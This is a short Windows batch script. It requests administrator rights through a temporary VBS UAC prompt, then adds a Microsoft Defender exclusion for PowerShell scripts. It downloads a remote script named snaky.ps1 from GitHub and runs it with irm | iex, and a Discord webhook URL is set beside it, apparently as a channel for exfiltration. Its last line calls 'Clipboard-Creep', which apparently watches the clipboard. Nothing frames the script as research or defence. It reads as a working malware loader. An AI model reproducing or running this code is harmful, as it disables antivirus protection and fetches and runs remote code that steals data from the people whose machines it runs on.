@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
Powershell -Command "Set-MpPreference -ExclusionExtension ps1"
cd %TEMP%
powershell -C "$dc='https://discord.com/api/webhooks/1377273360899244032/sfISpqX7vLusl2HGJ3Jwsirra-A6vPogZPUEsTTmYPgDVCXWnRIIGYy5UObuNX1P8wVF'; irm https://raw.githubusercontent.com/CloudFox9/Files/refs/heads/main/snaky.ps1 | iex"
powershell -C "Clipboard-Creep"
